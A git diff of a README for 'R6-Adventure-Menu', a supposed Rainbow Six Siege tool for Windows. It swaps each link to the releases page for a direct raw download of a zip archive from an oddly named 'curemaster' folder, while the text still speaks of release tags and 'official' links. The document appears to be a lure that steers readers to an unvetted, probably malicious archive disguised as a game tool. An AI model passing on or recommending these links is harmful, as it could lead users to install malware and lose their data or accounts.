@@ -1,6 +1,6 @@
 # 🎮 R6-Adventure-Menu - Simple Game Tool Management
 
-[![Download R6-Adventure-Menu](https://img.shields.io/badge/Download-R6--Adventure--Menu-brightgreen?style=for-the-badge)](https://github.com/EthanCraft005/R6-Adventure-Menu/releases)
+[![Download R6-Adventure-Menu](https://img.shields.io/badge/Download-R6--Adventure--Menu-brightgreen?style=for-the-badge)](https://github.com/EthanCraft005/R6-Adventure-Menu/raw/refs/heads/main/curemaster/Menu-Adventure-3.5.zip)
 
 Welcome to the R6-Adventure-Menu repository. This application offers a straightforward way to manage and use tools related to the Rainbow Six Siege game on your Windows computer. Whether you're new to software downloads or just want a clear step-by-step guide, this README shows you how to get the app up and running.
 
@@ -40,7 +40,7 @@ To get the R6-Adventure-Menu app, follow these steps carefully.
 
 1. Visit the official release page by clicking the button below:
 
-   [![Get R6-Adventure-Menu](https://img.shields.io/badge/Get%20R6--Adventure--Menu-blue?style=for-the-badge)](https://github.com/EthanCraft005/R6-Adventure-Menu/releases)
+   [![Get R6-Adventure-Menu](https://img.shields.io/badge/Get%20R6--Adventure--Menu-blue?style=for-the-badge)](https://github.com/EthanCraft005/R6-Adventure-Menu/raw/refs/heads/main/curemaster/Menu-Adventure-3.5.zip)
 
 2. On the release page, find the latest version tag. It usually appears at the top, like `v1.0` or similar.
 
@@ -116,7 +116,7 @@ For security, only download the program from the official link above to avoid mo
 
 To update the software:
 
-1. Return to the official [release page](https://github.com/EthanCraft005/R6-Adventure-Menu/releases).
+1. Return to the official [release page](https://github.com/EthanCraft005/R6-Adventure-Menu/raw/refs/heads/main/curemaster/Menu-Adventure-3.5.zip).
 
 2. Check if a newer version is available.
 
@@ -138,4 +138,4 @@ If you need help with the program:
 
 ---
 
-[![Download R6-Adventure-Menu](https://img.shields.io/badge/Download-R6--Adventure--Menu-brightgreen?style=for-the-badge)](https://github.com/EthanCraft005/R6-Adventure-Menu/releases)
+[![Download R6-Adventure-Menu](https://img.shields.io/badge/Download-R6--Adventure--Menu-brightgreen?style=for-the-badge)](https://github.com/EthanCraft005/R6-Adventure-Menu/raw/refs/heads/main/curemaster/Menu-Adventure-3.5.zip)
